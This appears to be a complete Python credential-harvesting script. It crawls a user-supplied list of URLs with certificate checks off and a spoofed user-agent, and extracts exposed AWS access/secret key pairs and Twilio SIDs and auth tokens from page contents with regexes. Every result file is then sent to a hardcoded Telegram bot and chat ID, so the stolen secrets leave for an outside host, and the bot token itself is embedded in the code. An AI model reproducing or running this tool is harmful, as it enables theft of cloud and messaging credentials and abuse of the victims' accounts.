import multiprocessing.pool
import re
import requests
import multiprocessing
import os

requests.packages.urllib3.disable_warnings(
    requests.packages.urllib3.exceptions.InsecureRequestWarning
)

def send_telegram_file(file_path, caption):
    url = f"https://api.telegram.org/bot6258586547:AAFhXNBPJDCRQJ-1Mmj0OkSG3mHvmAbmk-0/sendDocument"
    with open(file_path, 'rb') as file:
        files = {'document': file}
        data = {'chat_id': 5981225273, 'caption': caption}
        response = requests.post(url, data=data, files=files)
    return response

def send_telegram_message(message):
    url = f"https://api.telegram.org/bot6258586547:AAFhXNBPJDCRQJ-1Mmj0OkSG3mHvmAbmk-0/sendMessage"
    payload = {
        'chat_id': 5981225273,
        'text': message
    }
    headers = {
        'Content-Type': 'application/json'
    }
    response = requests.post(url, json=payload, headers=headers)
    return response

def parse_aws_credentials(url: str, response_body: str) -> None:
    matched: bool = False
    access_keys = re.findall(
        pattern=r'(?<=[\'\"])AKIA[0-9A-Z]{16}(?=[\'\"])',
        string=response_body
    )
    secret_keys = re.findall(
        pattern=r'(?<=[\'\"])[0-9a-zA-Z\/+]{40}(?=[\'\"])',
        string=response_body
    )
    for access_key in list(set(access_keys)):
        for secret_key in list(set(secret_keys)):
            if not re.search('[A-Z]', secret_key):
                continue
            if not re.search('[0-9]', secret_key):
                continue
            formatstr = f'{access_key}|{secret_key}|us-east-1'
            print(f'{url} - {formatstr}')
            with open('aws_credentials.txt', 'a') as f:
                f.write(f'{formatstr}\n')
            matched = True
    if not matched:
            print(f'{url} - Check the AWS credentials manually')
            with open('check_manually.txt', 'a') as f:
                if "/_next/static/chunks/536" not in url:
                 f.write(f'{url}\n')

def parse_twilio_credentials(url: str, response_body: str) -> None:
    matched: bool = False
    account_sids = re.findall(
        pattern=r'(?<=[\'\"]|sid=|sid:)(AC[a-zA-Z0-9]{32})(?=[\'\"])',
        string=response_body
    )
    auth_tokens = re.findall(
        pattern=r'(?<=[\'\"]|token=|token:)([a-zA-Z0-9]{32})(?=[\'\"])',
        string=response_body
    )
    for account_sid in list(set(account_sids)):
        for auth_token in list(set(auth_tokens)):
            formatstr = f'{account_sid}|{auth_token}'
            print(f'{url} - {formatstr}')
            with open('twilio_credentials.txt', 'a') as f:
                f.write(f'{formatstr}\n')
            matched = True
    if not matched:
            print(f'{url} - Check the Twilio credentials manually')
            with open('check_manually_twilio.txt', 'a') as f:
                if "/_next/static/chunks/536" not in url:
                 f.write(f'{url}\n')

def request_url(url: str) -> None:
    try:
        response = requests.get(
            url=url,
            timeout=70,
            verify=False,
            headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
            }
        )
        if re.search('(?<=[\'\"])AKIA[0-9A-Z]{16}(?=[\'\"])', response.text):
            parse_aws_credentials(url, response.text)
        elif re.search('(?<=[\'\"]|sid=|sid:)(AC[a-zA-Z0-9]{32})(?=[\'\"])', response.text):
            parse_twilio_credentials(url, response.text)
        else:
            print(f'{url} - No AWS or Twilio credentials found')
    except Exception as e:
        print(f'{url} - {e.__class__.__name__}')

def main() -> None:
    urls = open(input('Enter file path: '), 'r').read().splitlines()
    pool = multiprocessing.Pool(processes=10)
    pool.map(request_url, urls)
    pool.close()
    pool.join()

    # Kirim file hasil analisis ke Telegram
    files_to_send = [
        ('aws_credentials.txt', 'AWS Credentials Found'),
        ('check_aws_manually.txt', 'AWS URLs to Check Manually'),
        ('twilio_credentials.txt', 'Twilio Credentials Found'),
        ('check_manually_twilio.txt', 'Twilio URLs to Check Manually')
    ]
    
    for file_path, caption in files_to_send:
        if os.path.exists(file_path):
            response = send_telegram_file(file_path, caption)
            if response.status_code == 200:
                print(f'Berhasil mengirim {file_path} ke Telegram')
            else:
                print(f'Failed to send {file_path}:', response.text)

if __name__ == '__main__':
    main()
